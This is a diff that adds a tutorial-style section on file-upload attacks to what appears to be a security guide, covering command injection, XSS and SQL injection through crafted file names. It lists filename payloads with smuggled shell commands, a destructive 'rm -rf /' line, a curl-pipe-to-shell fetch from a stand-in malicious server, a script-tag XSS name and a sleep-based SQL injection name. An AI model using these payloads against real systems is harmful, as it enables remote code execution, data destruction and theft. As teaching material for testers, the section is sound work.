@@ -646,3 +646,86 @@ You can check the existing metadata of an image using ExifTool with the followin
 ```bash
 exiftool image.jpg
 ```
+
+### **File Name and Command Injection**
+File names can sometimes be used in server-side operations such as moving, renaming, or processing files. If an attacker can control the file name, they might inject commands that the server might execute, leading to serious security issues.
+
+#### **Example: Command Injection via File Name**
+Suppose a web application allows users to upload files and then uses an **OS command** to move the uploaded file to a different directory. If the file name is not sanitized and is directly used in the command, attackers can inject arbitrary commands.
+
+For example, imagine the server uses a command like this to move the uploaded file:
+```bash
+mv file /tmp
+```
+Now, if the attacker names the file as:
+- `file$(whoami).jpg`
+- `file\`whoami\`.jpg`
+- `file.jpg||whoami`
+
+These filenames contain **injected commands** (like `$(whoami)` or backticks with `whoami`), which are a common way to run OS commands on Unix-like systems.
+
+When the server executes the **mv** command, it might mistakenly treat the injected part of the file name as an OS command, and execute it. The result would be the attacker gaining information about the current user or running arbitrary commands on the server.
+
+For example:
+- `file$(whoami).jpg` could result in:
+  ```bash
+  mv file$(whoami).jpg /tmp
+  ```
+  If executed, this could run the `whoami` command, and the server might output something like `root` if the server is running with root privileges, which gives the attacker useful information.
+
+#### **How this leads to RCE**:
+If the attacker can inject more dangerous commands like:
+- `file.jpg; rm -rf /` or
+- `file.jpg && curl http://malicious-server.com/malware.sh | sh`
+
+Then they can execute commands that might lead to **Remote Code Execution (RCE)** on the server.
+
+---
+
+#### **File Name and XSS (Cross-Site Scripting)**
+If the application reflects the file name back to the user without sanitizing it, attackers can inject **JavaScript payloads** into the file name. This can lead to **XSS attacks** if the file name is displayed in an HTML page, like in an image caption or a link.
+
+##### **Example: XSS via File Name**
+Suppose the application displays the file name after uploading, such as:
+```html
+<p>File uploaded: file.jpg</p>
+```
+If the attacker uploads a file with a malicious name like:
+- `file.jpg<script>alert(window.origin);</script>`
+
+This would result in:
+```html
+<p>File uploaded: file.jpg<script>alert(window.origin);</script></p>
+```
+When the page is rendered, the script gets executed, and the attacker can execute arbitrary JavaScript on the victim's browser.
+
+##### **How this can be dangerous**:
+XSS can allow an attacker to steal session cookies, redirect the user to a malicious website, or perform other malicious actions in the context of the victim's session.
+
+---
+
+#### **File Name and SQL Injection**
+Sometimes, the file name is used directly in **SQL queries** without proper sanitization. If the file name is inserted into an SQL query, an attacker might inject malicious SQL commands, potentially leading to **SQL injection** vulnerabilities.
+
+##### **Example: SQL Injection via File Name**
+If the application uses the file name in an SQL query to log file uploads or process them, and the file name is not sanitized, an attacker can inject SQL statements.
+
+For instance, if the file name is inserted into a query like this:
+```sql
+SELECT * FROM files WHERE filename = 'uploaded_file_name';
+```
+An attacker might upload a file with a name like:
+- `file';select+sleep(5);--.jpg`
+
+The resulting SQL query would look like:
+```sql
+SELECT * FROM files WHERE filename = 'file';select+sleep(5);--.jpg';
+```
+- The `--` in SQL is a comment, so the rest of the query is ignored.
+- The `select+sleep(5);` command causes the database to pause for 5 seconds, which is useful for testing SQL injection and might indicate that the application is vulnerable to further attacks.
+
+#### **How this leads to SQL Injection**:
+If the application uses the file name directly in an SQL query without sanitizing it, attackers could potentially modify the query to:
+- **Bypass authentication**: Injecting SQL to log in as an administrator.
+- **Extract data**: Using SQL injection to read sensitive information from the database.
+- **Modify or delete data**: SQL injection can allow attackers to modify or delete records in the database.
